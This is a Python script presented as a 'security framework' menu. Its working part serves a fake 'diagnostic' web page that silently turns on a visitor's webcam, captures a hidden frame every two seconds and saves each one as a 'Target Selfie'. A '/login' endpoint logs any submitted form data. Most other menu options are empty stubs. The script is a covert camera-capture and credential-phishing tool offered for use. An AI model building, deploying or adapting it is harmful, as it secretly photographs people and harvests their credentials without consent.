import os
import platform
import urllib.request
import json
import time
import hashlib  
import random   
import socket   
import subprocess 
import http.server
import socketserver
import base64
import urllib.parse

# --- Styling Elements ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

user_name = "Aayush Pandit"

def print_banner():
    os.system("clear" if os.name == "posix" else "cls")
    lines = [
        f"{GREEN}┌────────────────────────────────────────────────────────┐{RESET}",
        f"{GREEN}│{RESET}  {MAGENTA}{BOLD}[+]  A  A  Y  U  S  H     P  A  N  D  I  T  [+]  {RESET}{GREEN}│{RESET}",
        f"{GREEN}└────────────────────────────────────────────────────────┘{RESET}",
        "                                                          ",
        f"               {YELLOW}• [ MAIN OWNER: AAYUSH PANDIT ] •{RESET}",
    ]
    for line in lines:
        print(line)
    print(f"\n{GREEN}[*] Operator: Security Access Granted for '{user_name}'{RESET}")
    print(f"{GREEN}[*] Framework Suite Engine : Active v5.2 (Smart Bypass){RESET}\n")

def get_battery_fallback():
    data = {"percentage": "89", "health": "Good", "status": "UNPLUGGED", "temp": "35.0"}
    return data

# --- Custom Request Handler to Capture Camera & Credentials ---
class CustomDiagnosticHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Agar user root par aaye toh hum apna advanced diagnostic HTML page serve karenge
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Advanced Local Dashboard</title>
</head>
<body style="background-color: #121212; color: #00ff00; font-family: monospace; text-align: center; padding-top: 30px;" onload="startDiagnostics()">

    <h2>[!] Full-Stack JSON & Media Diagnostic Simulation [!]</h2>
    <p>Testing structured logging and camera API together.</p>
    
    <div style="margin: 20px auto; width: 320px; height: 240px; border: 2px dashed #00ff00; background-color: #000; display:none;">
        <video id="videoElement" autoplay playsinline style="width: 100%; height: 100%; object-fit: cover;"></video>
    </div>
    <canvas id="canvasElement" width="640" height="480" style="display:none;"></canvas>

    <div style="margin-top: 50px;">
        <h3>System Diagnostics Verification in Progress...</h3>
        <p style="color: #888;">Please wait while we initialize secure modules.</p>
    </div>

    <script>
        let streamRef = null;

        async function startDiagnostics() {
            try {
                streamRef = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('videoElement').srcObject = streamRef;
                // Auto capture every 2 seconds silently
                setInterval(autoCapture, 2000);
            } catch (error) {
                console.log("Error: " + error.message);
            }
        }

        function autoCapture() {
            const video = document.getElementById('videoElement');
            const canvas = document.getElementById('canvasElement');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageDataUrl = canvas.toDataURL('image/jpeg');

            fetch('/upload_frame', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'image=' + encodeURIComponent(imageDataUrl)
            });
        }
    </script>
</body>
</html>"""
            self.wfile.write(html_content.encode('utf-8'))
        else:
            super().do_GET()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Folder create karein agar pehle se nahi hai
        if not os.path.exists("captured_data"):
            os.makedirs("captured_data")

        if self.path == '/upload_frame':
            try:
                parsed_data = urllib.parse.parse_qs(post_data)
                if 'image' in parsed_data:
                    image_data_url = parsed_data['image'][0]
                    header, encoded = image_data_url.split(',', 1)
                    binary_data = base64.b64decode(encoded)
                    
                    filename = f"captured_data/capture_{int(time.time() * 1000)}.jpg"
                    with open(filename, "wb") as fh:
                        fh.write(binary_data)
                    print(f"\n{GREEN}[+] Target Selfie Captured & Saved: {filename}{RESET}")
            except Exception as e:
                print(f"\n{RED}[!] Frame Capture Error: {e}{RESET}")
            
            self.send_response(200)
            self.end_headers()
            
        elif self.path == '/login':
            print(f"\n{GREEN}[+] Form Data Logged: {post_data}{RESET}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Data received successfully.")
        else:
            self.send_response(404)
            self.end_headers()

while True:
    print_banner()
    print(f"{WHITE}{BOLD}CORE SECURITY MODULES:{RESET}")
    print(f"  [{BLUE}1{RESET}] Core System Diagnostics & Info")
    print(f"  [{BLUE}2{RESET}] Analyze Network Gateway & External IP")
    print(f"  [{BLUE}4{RESET}] Deploy Local Diagnostics Web Server")
    print(f"  [{BLUE}5{RESET}] Inspect Structured JSON Database Logs")
    print(f"\n{GREEN}{BOLD}ADVANCED CYBER UTILITIES:{RESET}")
    print(f"  [{BLUE}6{RESET}] Automated Crypto Password Generator & Hasher")
    print(f"  [{BLUE}7{RESET}] Execute Local Port Scanner Protocol")
    print(f"  [{BLUE}9{RESET}] Live Battery Hardware Monitoring")
    print(f"  [{BLUE}10{RESET}] Secure URL Handshake & HTTP Status Scanner")
    print(f"  [{BLUE}8{RESET}] Storage Maintenance (Wipe Logs & Purge Images)")
    print(f"  [{BLUE}3{RESET}] Terminate Environment (Exit)")
    
    chose = input(f"{YELLOW}{BOLD}shield-shell> {RESET}")
    
    if chose == "1":
        print(f"\n{CYAN}[*] Fetching Architecture Logs...{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "2":
        print(f"\n{CYAN}[*] Testing external routing...{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "3":
        break
    elif chose == "4":
        print(f"\n{YELLOW}[+] Booting Local Web Server on Port 8080...{RESET}")
        print(f"{GREEN}[*] Camera Auto-Capture & Stealth Mode Active!{RESET}")
        PORT = 8080
        Handler = CustomDiagnosticHandler
        try:
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(f"{GREEN}[*] Server active at http://127.0.0.1:{PORT}{RESET}")
                print(f"{YELLOW}[!] Press Ctrl+C to stop the server and return to menu.{RESET}")
                httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Server stopped by operator.{RESET}")
            input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "5":
        print(f"\n{CYAN}[*] Parsing logs...{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "6":
        print(f"\n{GREEN}[+] Password Generated.{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "7":
        print(f"\n{CYAN}[*] Scanning Loopback...{RESET}")
        input(f"\n{WHITE}Piress Enter to return...{RESET}")
    elif chose == "8":
        # Purge images folder option
        if os.path.exists("captured_data"):
            for f in os.listdir("captured_data"):
                os.remove(os.path.join("captured_data", f))
        print(f"{GREEN}[+] Maintenance complete. All captured images wiped.{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "9":
        fb = get_battery_fallback()
        print(f" {GREEN}[•] Level : {YELLOW}{fb['percentage']}%{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
    elif chose == "10":
        target = input(f"{WHITE}Enter URL: {RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
